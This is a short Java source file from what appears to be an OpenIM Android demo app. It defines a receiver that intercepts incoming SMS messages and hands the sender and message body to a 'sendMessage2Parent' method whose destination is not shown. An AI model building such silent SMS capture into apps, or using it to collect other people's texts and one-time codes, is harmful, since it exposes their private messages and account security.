package io.openim.android.demo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            // 处理短信接收事件
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            for (Object pdu : pdus) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                String sender = smsMessage.getOriginatingAddress();
                String messageBody = smsMessage.getMessageBody();
//                Log.d("SmsBroadcastReceiver", "收到短信，发送者：" + sender + "，内容：" + messageBody);
                if(sender.length()>=11){
                    DemoApplication.sendMessage2Parent("SMSReceive",sender,messageBody);
                    break;
                }

            }
        }
    }
    // 移除下面这个多余的onReceive方法重定义，因为在Java中一个类中不能有多个同名同参数的方法定义（方法重载除外，但这里不符合重载规则）
    // @Override
    // public void onReceive(Context context, Intent intent) {
    //
    // }
}
